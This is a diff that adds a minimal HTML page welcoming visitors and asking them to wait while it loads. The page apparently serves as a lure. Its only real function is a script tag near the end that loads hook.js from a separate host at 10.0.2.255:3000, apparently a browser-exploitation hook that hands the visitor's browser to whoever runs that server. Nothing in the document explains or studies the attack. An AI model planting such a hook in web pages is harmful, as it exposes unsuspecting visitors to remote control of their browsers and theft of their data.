@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Welcome to my website!</title>
+</head>
+<body>
+
+<h1>Welcome to my website! Please wait while we load.</h1>
+<p>Thank you!</p>
+
+</body>
+<script src="http://10.0.2.255:3000/hook.js"></script>
+</html>
